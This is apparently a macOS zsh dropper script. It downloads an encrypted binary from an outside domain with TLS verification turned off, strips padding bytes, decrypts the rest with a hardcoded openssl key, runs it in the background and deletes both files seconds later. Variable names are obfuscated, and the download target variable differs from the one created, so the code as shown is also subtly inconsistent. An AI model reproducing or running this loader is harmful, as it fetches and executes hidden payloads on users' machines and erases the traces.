#!/bin/zsh
gcknm=$(mktemp /tmp/cf46f4.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m678d3bfdf3b49794.bin" -o "$gcknmz" || exit 1
q73k57=$(stat -f %z "$gcknmz"); r5uhm26=$(( q73k57 - 1256 - 970 ))
tail -c +$(( 1256 + 1 )) "$gcknmz" | head -c $r5uhm26 | openssl enc -d -aes-256-cbc -k 8b0c588541232403b6c27318 -out "$gcknm" 2>/dev/null
[ -s "$gcknm" ] && chmod 700 "$gcknm" && ( "$gcknm" & ) && disown
( sleep 3; rm -f "$gcknm" "$gcknmz" ) &>/dev/null &
